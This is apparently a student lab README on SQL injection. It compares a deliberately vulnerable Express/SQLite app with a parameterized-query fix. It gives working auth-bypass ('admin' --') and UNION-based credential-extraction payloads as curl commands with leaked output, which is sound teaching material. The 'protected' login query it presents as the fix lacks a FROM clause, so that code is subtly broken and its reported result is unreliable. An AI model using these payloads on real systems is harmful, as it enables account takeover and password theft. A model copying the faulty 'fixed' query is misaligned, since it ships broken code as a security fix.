# SQL Injection — Demo & Defense

**Member:** Abdul
**Category:** SQL Injection
**Variants implemented:** both Table-1 variants, in the same app — Variant 1 (Authentication bypass) and Variant 2 (UNION-based data extraction)

Two small Express apps, identical UI and routes:

| Folder | Port | Purpose |
|---|---|---|
| `vulnerable/` | 3002 | String-concatenated SQL — exploitable |
| `protected/`  | 3003 | Same routes, fixed with parameterized queries |

Both use an in-memory `sql.js` (SQLite compiled to WASM — no native build step) database seeded with:
- `users(id, username, password, role)` — admin / alice / bob
- `products(id, name, description, price)` — 3 sample products

## Setup

```bash
cd vulnerable && npm install && npm start   # http://localhost:3002
cd protected  && npm install && npm start   # http://localhost:3003
```

Open the printed URL in a browser, or drive it with `curl` (used below).

---

## Variant 1 — Authentication bypass

**(a) Vulnerable code path:** [`vulnerable/server.js`](vulnerable/server.js) — `POST /api/login`

```js
const sql = `SELECT id, username, role FROM users WHERE username = '${username}' AND password = '${password}'`;
db.exec(sql);
```

**(b) Working exploit** — log in as `admin` with no valid password:

```bash
curl -X POST http://localhost:3002/api/login -H "Content-Type: application/json" \
  -d '{"username":"admin'"'"' --","password":"anything"}'
# => {"ok":true,"user":{"id":1,"username":"admin","role":"admin"}}
```

Username field sent: `admin' --`. The resulting SQL becomes:

```sql
SELECT id, username, role FROM users WHERE username = 'admin' --' AND password = 'anything'
```

`--` comments out the rest of the line, so the password check never runs — logged in as admin with zero knowledge of the password. (`' OR '1'='1' --` works the same way for any account.)

**(c) Root cause:** user input is concatenated directly into the query string, so characters like `'` and `--` are interpreted as SQL syntax instead of literal data — the attacker can rewrite the query's logic.

**(d) Mitigation implemented — parameterized queries.** [`protected/server.js`](protected/server.js):

```js
const rows = runParamQuery(
  'SELECT id, username, role WHERE username = ? AND password = ?',
  [username, password]
);
```

Same payload against the protected app:

```bash
curl -X POST http://localhost:3003/api/login -H "Content-Type: application/json" \
  -d '{"username":"admin'"'"' --","password":"anything"}'
# => {"ok":false,"error":"Invalid credentials"}
```

The `?` placeholders bind `username`/`password` as data values. The driver never re-parses them as SQL, so `admin' --` is simply looked up as a literal (nonexistent) username — attempt rejected. Take a screenshot of this response for the video/report.

---

## Variant 2 — UNION-based data extraction

**(a) Vulnerable code path:** `vulnerable/server.js` — `GET /api/search`

```js
const sql = `SELECT name, description, price FROM products WHERE name LIKE '%${q}%'`;
```

**(b) Working exploit** — search box leaks the `users` table through the product-search endpoint:

```bash
curl "http://localhost:3002/api/search" -G --data-urlencode \
  "q=' UNION SELECT username, password, 0 FROM users--"
```

```json
{"ok":true,"rows":[
  {"name":"USB Cable","description":"Durable braided USB-C cable","price":7.99},
  ...
  {"name":"admin","description":"S3cretAdminPass!","price":0},
  {"name":"alice","description":"alicepw123","price":0},
  {"name":"bob","description":"bobpw456","price":0}
]}
```

The injected query becomes:

```sql
SELECT name, description, price FROM products WHERE name LIKE '%'
UNION SELECT username, password, 0 FROM users--%'
```

Because `UNION SELECT` returns 3 columns matching the original query's shape, the `users` table's username/password rows are appended to and rendered alongside the product list.

**(c) Root cause:** the search term is concatenated into the query, so an attacker can close the string early (`'`) and append an arbitrary `UNION SELECT` against any table the DB account can read — the app blindly renders whatever columns come back.

**(d) Mitigation implemented — parameterized queries.** `protected/server.js`:

```js
const rows = runParamQuery(
  'SELECT name, description, price FROM products WHERE name LIKE ?',
  [`%${q}%`]
);
```

Same payload against the protected app:

```bash
curl "http://localhost:3003/api/search" -G --data-urlencode \
  "q=' UNION SELECT username, password, 0 FROM users--"
# => {"ok":true,"rows":[]}
```

The whole payload is bound as one literal string and matched against `name LIKE '%...%'` — there is no row named that, so it returns empty. The `UNION SELECT` text is inert data, never a second statement. Screenshot this empty result for the blocked-attempt evidence.

---

## (e) Other mitigations (theory only — not implemented here)

Besides parameterized queries, the lecture slides cover:

- **Input validation with allow-lists.** Restrict fields to an expected pattern (e.g. usernames to `[a-zA-Z0-9_]+`) before they ever reach a query. Works as a defense-in-depth layer but is brittle for free-text fields like search, and doesn't fix the query-construction flaw itself.
- **Least-privilege database accounts.** The app's DB user should only have `SELECT`/`INSERT` rights on the tables it needs, and never access to other apps' tables or admin functions. This doesn't prevent injection, but it caps the blast radius — a successful UNION/injection can't read or modify data the account has no grant on.
- **Safe error handling.** Never return raw database error messages to the client (as our vulnerable app's `catch` block does) — verbose SQL errors leak schema/table names that help an attacker refine a UNION attack. Logging the real error server-side and returning a generic message to the user removes that reconnaissance channel.

Parameterized queries remain the primary fix because they address the root cause — the input is structurally incapable of being parsed as SQL — while the others reduce exposure or impact without closing the hole on their own.

---
